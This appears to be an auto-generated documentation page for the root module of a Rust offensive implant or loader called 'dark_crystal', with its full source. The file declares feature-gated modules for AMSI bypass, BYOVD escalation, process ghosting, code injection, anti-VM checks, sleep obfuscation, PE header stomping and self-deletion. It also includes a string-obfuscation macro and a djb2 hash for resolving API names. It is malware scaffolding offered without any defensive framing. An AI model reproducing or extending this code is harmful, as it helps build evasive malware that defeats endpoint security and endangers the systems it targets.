# lib

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crates/core/src/lib.rs` |
| **Lines** | 99 |
| **Cards** | T023-client-capabilities |
| **Role** | Module declarations |
| **Feature gates** | verbose_debug, module_overload, recycled_gate, amsi_bypass, hammering, ekko, byovd, anti_vm, fiber, iat_camou, ghosting, self_delete, pe_stomp |

## Constants

- `ORDER`: `[&str; 4]` = `["quiet", "info", "debug", "trace"]`

## Public API

### `compute_hash` (line 93)
```rust
pub fn compute_hash(function_name: &str) -> u32
```

## Internal Functions

- `drop` (line 38)

## Macros

- `verbose_log!` (macro_rules, line 15)
- `verbose_log!` (macro_rules, line 24)
- `obf!` (macro_rules, line 29)

## Full Source

```rust
#![allow(non_snake_case)]
#![allow(dead_code)]
#![allow(clippy::too_many_arguments)]

#[inline(always)]
pub(crate) fn log_enabled(target: &str) -> bool {
    const ORDER: [&str; 4] = ["quiet", "info", "debug", "trace"];
    let cur = crate::selection_config::log_level();
    let idx = ORDER.iter().position(|l| *l == cur).unwrap_or(2);
    let tgt = ORDER.iter().position(|l| *l == target).unwrap_or(2);
    idx >= tgt
}

#[cfg(feature = "verbose_debug")]
macro_rules! verbose_log {
    ($($arg:tt)*) => {{
        if $crate::selection_config::verbose_debug() && $crate::log_enabled("debug") {
            println!("[DEBUG] {}", format_args!($($arg)*));
        }
    }};
}

#[cfg(not(feature = "verbose_debug"))]
macro_rules! verbose_log {
    ($($arg:tt)*) => {{}};
}

#[macro_export]
macro_rules! obf {
    ($($arg:tt)*) => {
        ::obf::obf!($($arg)*)
    };
}

pub(crate) struct DebugPauseGuard;

impl Drop for DebugPauseGuard {
    fn drop(&mut self) {
        if crate::selection_config::verbose_debug() {
            verbose_log!("FASE 9: pausa de observabilidad (2s) antes de salir");
            std::thread::sleep(std::time::Duration::from_secs(2));
        }
    }
}

pub mod crypto;
#[cfg(any(feature = "threadless", feature = "process_reflection"))]
pub mod injection;
#[cfg(feature = "module_overload")]
pub mod loader;
pub mod runner;
mod sys_indirect;
mod sys_resolve;
mod sysindirect_map;
#[cfg(feature = "recycled_gate")]
pub mod sys_recycled;
pub mod transport;
pub mod wrappers;

#[cfg(feature = "amsi_bypass")]
#[path = "experimental/amsi_hbp.rs"]
pub mod amsi_hbp;
#[cfg(feature = "hammering")]
#[path = "experimental/api_hammering.rs"]
pub mod api_hammering;
#[cfg(feature = "ekko")]
pub mod ekko_variants;
#[cfg(feature = "byovd")]
pub mod escalation;
#[cfg(feature = "anti_vm")]
#[path = "experimental/evade_vm.rs"]
pub mod evade_vm;
pub mod evasion;
#[cfg(feature = "fiber")]
#[path = "experimental/fiber_inject.rs"]
pub mod fiber_inject;
#[cfg(feature = "iat_camou")]
#[path = "experimental/iat_camouflage.rs"]
pub mod iat_camouflage;
pub mod pe;
#[cfg(feature = "ghosting")]
#[path = "experimental/process_ghosting.rs"]
pub mod process_ghosting;
pub mod selection_config;
#[cfg(feature = "self_delete")]
#[path = "experimental/self_deletion.rs"]
pub mod self_deletion;
#[cfg(feature = "pe_stomp")]
#[path = "experimental/pe_header_stomp.rs"]
pub mod pe_header_stomp;

#[inline(always)]
pub fn compute_hash(function_name: &str) -> u32 {
    let mut hash: u32 = 5381;
    for byte in function_name.as_bytes() {
        hash = ((hash << 5).wrapping_add(hash)).wrapping_add(*byte as u32);
    }
    hash
}

```